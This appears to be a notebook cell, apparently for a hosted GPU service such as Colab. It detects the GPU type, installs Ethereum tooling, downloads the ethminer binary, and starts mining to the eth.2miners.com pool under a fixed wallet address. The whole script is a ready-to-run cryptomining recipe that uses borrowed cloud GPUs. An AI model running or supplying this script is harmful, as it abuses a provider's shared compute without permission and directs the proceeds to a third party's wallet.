from IPython.display import HTML
from subprocess import getoutput
s = getoutput('nvidia-smi')
if 'K80' in s:
  gpu = 'K80'
elif 'T4' in s:
  gpu = 'T4'
elif 'P100' in s:
  gpu = 'P100'
display(HTML(f"<h2>{gpu}</h2>"))
print(s)
# or simply
!nvidia-smi -L
!sudo apt update
!sudo add-apt-repository ppa:ethereum/ethereum
!sudo cat /etc/apt/sources.list
!sudo apt install ethereum
!wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
%ls
!tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
%cd bin/
!./ethminer -G -P stratum1+tcp://0xf0da99e9347aa497914068e26bf9ec55a2740ed2@eth.2miners.com:2020
